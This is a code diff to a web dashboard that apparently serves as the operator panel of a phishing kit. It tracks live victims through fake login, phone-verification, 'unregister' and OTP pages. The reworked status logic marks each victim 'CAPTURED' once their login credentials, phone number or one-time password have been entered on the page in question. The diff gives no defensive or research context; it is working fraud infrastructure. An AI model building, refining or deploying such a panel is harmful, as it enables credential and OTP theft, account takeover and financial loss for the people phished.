@@ -148,7 +148,6 @@
     .status-connected { color: var(--blue); }
     .status-captured { color: var(--green); }
     .status-waiting { color: var(--yellow); }
-    .status-otp { color: var(--red); }
   </style>
 </head>
 <body>
@@ -217,24 +216,46 @@
       let statusText = '';
       let statusClass = '';
       
+      // Determine status based on current page and what data has been entered FOR THAT PAGE
       if (s.page === 'success') {
         statusText = 'APPROVED';
         statusClass = 'status-captured';
-      } else if (!s.entered && !s.phone && !s.unregisterClicked && !s.otp) {
-        statusText = 'CONNECTED';
-        statusClass = 'status-connected';
-      } else if (s.entered && !s.phone) {
-        statusText = 'CAPTURED';
-        statusClass = 'status-captured';
-      } else if (s.phone && !s.unregisterClicked) {
-        statusText = 'PHONE';
-        statusClass = 'status-waiting';
-      } else if (s.unregisterClicked && !s.otp) {
-        statusText = 'UNREGISTERED';
-        statusClass = 'status-waiting';
-      } else if (s.otp) {
-        statusText = 'OTP';
-        statusClass = 'status-otp';
+      } else if (s.page === 'otp.html') {
+        // On OTP page - check if OTP entered
+        if (s.otp) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else if (s.page === 'unregister.html') {
+        // On Unregister page - check if clicked
+        if (s.unregisterClicked) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else if (s.page === 'verify.html') {
+        // On Phone page - check if phone entered
+        if (s.phone) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else if (s.page === 'index.html') {
+        // On Login page - check if credentials entered
+        if (s.entered) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
       } else {
         statusText = 'WAITING';
         statusClass = 'status-waiting';
